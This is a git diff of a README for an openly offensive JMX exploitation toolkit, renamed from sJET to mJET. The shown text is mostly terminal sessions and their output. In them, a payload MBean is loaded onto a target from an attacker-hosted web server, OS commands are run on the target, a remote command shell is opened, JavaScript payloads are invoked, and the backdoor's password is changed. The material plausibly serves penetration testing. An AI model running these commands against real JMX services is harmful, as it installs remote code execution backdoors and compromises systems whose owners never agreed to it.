@@ -11,10 +11,10 @@ information can be found [here](https://www.optiv.com/blog/exploiting-jmx-rmi) a
 
 ## Usage
 
-SJET implements a CLI interface (using [argparse](https://docs.python.org/3/library/argparse.html)):
+mJET implements a CLI interface (using [argparse](https://docs.python.org/3/library/argparse.html)):
 
 ```
-jython sjet.py targetHost targetPort password MODE (modeOptions)
+jython mjet.py targetHost targetPort password MODE (modeOptions)
 ```
 Where
 
@@ -52,7 +52,7 @@ After the successful installation of the MBean, the default password is changed 
 at the command line ("super_secret").
 
 ```
-h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret install http://192.168.11.132:8000 8000
+h0ng10@rocksteady:~/mjet$ jython mjet.py 192.168.11.136 9991 super_secret install http://192.168.11.132:8000 8000
 mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Starting webserver at port 8000
@@ -68,12 +68,12 @@ mJET - MOGWAI LABS JMX Exploitation Toolkit
 [+] Loaded de.mogwailabs.mlet.MogwaiLabsPayload
 [+] Successfully changed password
 
-h0ng10@rocksteady:~/sjet$
+h0ng10@rocksteady:~/mjet$
 ```
 
 Installation with JMX credentials (also needs a weak configuration of the server):
 ```
-h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret install http://192.168.11.132:8000 8000 --jmxrole JMXUSER --jmxpassword JMXPASSWORD
+h0ng10@rocksteady:~/mjet$ jython mjet.py 192.168.11.136 9991 super_secret install http://192.168.11.132:8000 8000 --jmxrole JMXUSER --jmxpassword JMXPASSWORD
 mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Starting webserver at port 8000
@@ -90,7 +90,7 @@ mJET - MOGWAI LABS JMX Exploitation Toolkit
 [+] Loaded de.mogwailabs.mlet.MogwaiLabsPayload
 [+] Successfully changed password
 
-h0ng10@rocksteady:~/sjet$
+h0ng10@rocksteady:~/mjet$
 ```
 
 ### Running the command 'ls -la' in a Linux target:
@@ -98,7 +98,7 @@ h0ng10@rocksteady:~/sjet$
 After the payload was installed, we can use it to execute OS commands on the target.
 
 ```
-h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret command "ls -la"
+h0ng10@rocksteady:~/mjet$ jython mjet.py 192.168.11.136 9991 super_secret command "ls -la"
 mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
@@ -116,7 +116,7 @@ lrwxrwxrwx  1 root    root      19 Mär 29 01:46 work -> ../../cache/tomcat8
 
 
 [+] Done
-h0ng10@rocksteady:~/sjet$
+h0ng10@rocksteady:~/mjet$
 ```
 ### Running ping in shell mode on a target
 
@@ -124,7 +124,7 @@ If you don't want to load Java for every command, you can use the "shell mode"
 to get a limited command shell.
 
 ```
-h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret shell
+h0ng10@rocksteady:~/mjet$ jython mjet.py 192.168.11.136 9991 super_secret shell
 mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
@@ -145,7 +145,7 @@ rtt min/avg/max/mdev = 0.044/0.055/0.075/0.014 ms
 
 >>> exit_shell
 [+] Done
-h0ng10@rocksteady:~/sjet$
+h0ng10@rocksteady:~/mjet$
 ```
 
 ### Invoke a JavaScript payload on a target:
@@ -154,7 +154,7 @@ The example script "javaproperties.js" displays the Java properties of the vulne
 service. It can be invoked as follows:
 
 ```
-h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret javascript scripts/javaproperties.js
+h0ng10@rocksteady:~/mjet$ jython mjet.py 192.168.11.136 9991 super_secret javascript scripts/javaproperties.js
 mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
@@ -173,7 +173,7 @@ file.encoding=UTF-8
 java.specification.version=1.8
 
 
-h0ng10@rocksteady:~/sjet$
+h0ng10@rocksteady:~/mjet$
 ```
 
 ### Change the password
@@ -181,7 +181,7 @@ h0ng10@rocksteady:~/sjet$
 Change the existing password ("super_secret") to "this-is-the-new-password":
 
 ```
-h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret password this-is-the-new-password
+h0ng10@rocksteady:~/mjet$ jython mjet.py 192.168.11.136 9991 super_secret password this-is-the-new-password
 mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
@@ -190,7 +190,7 @@ mJET - MOGWAI LABS JMX Exploitation Toolkit
 [+] Successfully changed password
 
 [+] Done
-h0ng10@rocksteady:~/sjet$
+h0ng10@rocksteady:~/mjet$
 ```
 
 ### Uninstall the payload MBean from the target
@@ -199,13 +199,13 @@ h0ng10@rocksteady:~/sjet$
 Uninstall the payload 'MogwaiLabs' from the target:
 
 ```
-minmaxer@prellermbp:~/sjet$ jython sjet.py 192.168.1.101 9010 super_secret uninstall
+minmaxer@prellermbp:~/mjet$ jython mjet.py 192.168.1.101 9010 super_secret uninstall
 mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.1.101:9010/jmxrmi
 [+] Connected: rmi://192.168.1.1  16
 [+] MBean correctly uninstalled
-minmaxer@prellermbp:~/sjet$
+minmaxer@prellermbp:~/mjet$
 ```
 
 
@@ -220,7 +220,7 @@ Feel free to contribute.
 * **Ben Campbell** - *Several improvements* - [Meatballs1](https://github.com/Meatballs1)
 * **Arnim Rupp** - *Authentication support*
 
-See also the list of [contributors](https://github.com/h0ng10/sjet/graphs/contributors) who participated in this project.
+See also the list of [contributors](https://github.com/mogwailabs/sjet/graphs/contributors) who participated in this project.
 
 ## License
 
